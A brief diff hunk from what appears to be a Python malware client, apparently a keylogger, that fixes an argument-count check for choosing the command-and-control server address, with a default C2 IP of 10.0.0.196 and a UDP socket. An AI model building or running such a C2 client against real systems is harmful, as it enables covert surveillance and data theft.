@@ -26,7 +26,7 @@ def key_thread():
 
 def main():
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    if len(argv) > 0:
+    if len(argv) > 1:
         C2_ip = argv[1]
     else:
         C2_ip = "10.0.0.196" # C2 server IP
